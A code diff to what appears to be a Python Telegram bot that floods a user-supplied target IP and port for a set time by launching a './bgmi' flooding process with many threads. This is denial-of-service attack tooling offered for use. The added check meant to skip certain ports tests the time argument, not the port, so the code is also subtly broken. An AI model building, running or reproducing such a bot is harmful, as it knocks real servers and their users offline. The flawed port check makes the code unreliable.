@@ -21,6 +21,9 @@ def handle_message(message):
     if len(cmd) != 3 or not '.' in cmd[0] or not cmd[1].isdigit() or not cmd[2].isdigit():
         bot.reply_to(message, '<target_ip> <port> <time>')
         return
+    if cmd[2] in invalid_ports:
+        bot.reply_to(message, 'ignored ports 8700, 20000, 443, 17500, 9031, 20002, 20001')
+        return
     target_ip, port, total_time = cmd
     flooding_process = subprocess.Popen(['./bgmi', target_ip, port, total_time, str(DEFAULT_THREADS)])
     stop_event = threading.Event()
